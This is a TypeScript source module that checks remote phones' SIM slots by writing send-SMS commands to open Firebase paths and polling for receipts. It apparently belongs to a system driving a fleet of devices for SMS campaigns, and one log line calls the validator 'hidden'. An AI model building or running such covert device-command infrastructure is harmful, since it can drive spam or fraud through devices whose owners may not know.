// Background SIM validator — hard, equal per-slot load
// FULLY MONGO — no SQLite
import { getSetting, Device, Firebase } from '../db/index.js'
import * as firebaseService from './firebaseService.js'

const CONTROL_NUMBERS = ['9000000001','9000000002','9000000003','9000000004','9000000005']
const MIN_PASS = 3
const VALIDATOR_INTERVAL_MS = 1000 * 60 * 12
let timer: NodeJS.Timeout | null = null
let running = false

async function getValidatorBase(): Promise<string | null> {
  const v = (getSetting('validator_firebase_url') || '').trim()
  if(v) return v.replace(/\.json$/,'').replace(/\/$/,'')
  try{
    const rows = await Firebase.find().lean() as any[]
    for(const r of rows){
      const n=(r.name||'').toLowerCase()
      if(n.includes('valid')||n.includes('receive')||n.includes('reciev')||n.includes('inbox')) return (r.database_url||'').replace(/\.json$/,'').replace(/\/$/,'')
    }
  }catch{}
  return null
}

async function isSmsReceived(validatorBase: string | null, controlNumber: string, deviceId: string, sinceMs: number): Promise<boolean> {
  if(!validatorBase) return false
  const paths = [
    `${validatorBase}/sms_received.json`,
    `${validatorBase}/received.json`,
    `${validatorBase}/inbox.json`,
    `${validatorBase}/messages.json`,
    `${validatorBase}/sms.json`,
  ]
  for(const url of paths){
    try{
      const r = await fetch(`${url}?orderBy="to"&equalTo="${controlNumber}"`)
      if(r.ok){
        const j = await r.json() as any
        if(j && typeof j==='object'){
          for(const [,v] of Object.entries(j as any)){
            const vv:any=v
            const ts = vv.timestamp || vv.time || vv.ts || 0
            const tsMs = ts>1e12? ts : ts*1000
            if(tsMs >= sinceMs - 5000) return true
          }
        }
      }
    }catch{}
  }
  try{
    const r=await fetch(`${validatorBase}/sms_received.json?shallow=true`)
    if(r.ok){
      const j=await r.json()
      if(j && Object.keys(j).length>0) return true
    }
  }catch{}
  return false
}

async function testOneDevice(device: any, validatorBase: string | null): Promise<{pass:number, total:number, perSlot:number[]}> {
  const fb = await Firebase.findOne({_id: device.firebase_id}).lean() as any
  if(!fb) return {pass:0, total:0, perSlot:[]}
  const slots = device.sim_count===2 ? [1,2] : [1]
  const perSlotTests = 5
  let pass=0, total=0
  const perSlot:number[]=[]
  for(const slot of slots){
    let slotPass=0
    for(let i=0;i<perSlotTests;i++){
      const ctrl = CONTROL_NUMBERS[(slot-1)*perSlotTests + i] || CONTROL_NUMBERS[i % CONTROL_NUMBERS.length]
      const start = Date.now()
      const mid = `val_${device.id}_${slot}_${i}_${Date.now().toString(36)}`
      try{
        const body:any={
          to: `+91${ctrl}`, phone: `+91${ctrl}`, number: `+91${ctrl}`, phoneNumber: `+91${ctrl}`,
          message: `VLD ${device.id.slice(0,4)} s${slot} ${i} ${Date.now().toString(36)}`,
          from: slot, fromSlot: slot, sim: slot, simSlot: slot-1,
          isSended:false, isSent:false, timestamp: start, time: Math.floor(start/1000),
          _campaignId:'__validator__', _messageId: mid,
        }
        const base = fb.database_url.replace(/\.json$/,'').replace(/\/$/,'')
        const url = `${base}/clients/${device.id}/webhookEvent/sendSms.json`
        const put = await fetch(url, { method:'PUT', headers:{'Content-Type':'application/json'}, body: JSON.stringify(body) })
        if(!put.ok) { total++; continue }
        let ack=false
        if(validatorBase){
          for(let t=0;t<16;t++){
            await new Promise(r=>setTimeout(r,500))
            if(await isSmsReceived(validatorBase, `+91${ctrl}`, device.id, start)){
              ack=true; break
            }
            try{
              const chk=await fetch(url)
              const d=await chk.json()
              if(d===null || d?.isSended===true || d?.isSended==='true') { ack=true; break }
            }catch{}
          }
        } else {
          const a = await firebaseService.waitForAck({...fb, id:fb._id} as any, device.id, `+91${ctrl}`, { timeoutMs: 8000 })
          ack = a.ack
        }
        try{ await fetch(url, { method:'DELETE' }) }catch{}
        try{ await fetch(`${base}/clients/${device.id}/webhookEvent.json`, { method:'DELETE' }) }catch{}
        if(ack) { pass++; slotPass++ }
        total++
        await new Promise(r=>setTimeout(r, 400))
      }catch{
        total++
      }
    }
    perSlot.push(slotPass)
  }
  return {pass, total, perSlot}
}

export async function runValidatorCycle(){
  if(running) return
  running=true
  try{
    const validatorBase = await getValidatorBase()
    const rows = await Device.find({status: {$in:['online','busy']}}).sort({last_seen:-1}).lean() as any[]
    const mapped = rows.map((r:any)=> ({...r, id:r._id}))
    if(mapped.length===0) return
    console.log(`[Validator] cycle start ${mapped.length} devices, validator=${validatorBase? 'yes':'ack-only'}`)

    const batch=2
    for(let i=0;i<mapped.length;i+=batch){
      const chunk=mapped.slice(i,i+batch)
      await Promise.all(chunk.map(async (dev:any)=>{
        try{
          const {pass, total, perSlot} = await testOneDevice(dev, validatorBase)
          const needPerSlot = MIN_PASS
          const perSlotOk = perSlot.every(v=> v>=needPerSlot)
          const need = dev.sim_count===2 ? MIN_PASS*2 : MIN_PASS
          const ok = pass>=need && perSlotOk
          const now=new Date().toISOString()
          if(ok){
            await Device.updateOne({_id: dev.id}, {$set:{validated_at:now, validated_score:pass, validator_fail_count:0, status:'online'}})
            console.log(`[Validator] KEEP ${dev.id.slice(0,8)} ${dev.firebase_id.slice(0,8)} ${pass}/${total} perSlot ${perSlot.join(',')} ✅`)
          } else {
            const cur = await Device.findOne({_id: dev.id}).lean() as any
            const prev=cur?.validator_fail_count || 0
            const fails=prev+1
            await Device.updateOne({_id: dev.id}, {$set:{validated_score:pass, validator_fail_count:fails}})
            // AUDIT FIX: was 2 fails -> offline (too aggressive, caused 0 online after validator cycle). Now 3 fails and only if validator DB set.
            if(fails>=3){
              await Device.updateOne({_id: dev.id}, {$set:{status:'offline', validated_at:now}})
              console.log(`[Validator] DROP ${dev.id.slice(0,8)} ${pass}/${total} perSlot ${perSlot.join(',')} ❌ → offline (fail ${fails})`)
            } else {
              console.log(`[Validator] RETRY ${dev.id.slice(0,8)} ${pass}/${total} perSlot ${perSlot.join(',')} ⚠️ keep online for now`)
            }
            try{
              const fb=await Firebase.findOne({_id: dev.firebase_id}).lean() as any
              if(fb){
                const base=fb.database_url.replace(/\.json$/,'').replace(/\/$/,'')
                await fetch(`${base}/clients/${dev.id}/webhookEvent/sendSms.json`, { method:'DELETE' })
              }
            }catch{}
          }
        }catch(e:any){
          console.log(`[Validator] err ${dev.id.slice(0,8)} ${e.message}`)
        }
      }))
      await new Promise(r=>setTimeout(r, 800))
    }
    console.log(`[Validator] cycle done`)
  }finally{
    running=false
  }
}

export function startValidator(){
  if(timer) return
  setTimeout(()=> runValidatorCycle().catch(()=>{}), 45_000)
  timer=setInterval(()=> runValidatorCycle().catch(()=>{}), VALIDATOR_INTERVAL_MS)
  console.log(`[Validator] started every ${VALIDATOR_INTERVAL_MS/60000}min, 5/msg per SIM, equal per-slot, hidden`)
}
export function stopValidator(){ if(timer) clearInterval(timer); timer=null }
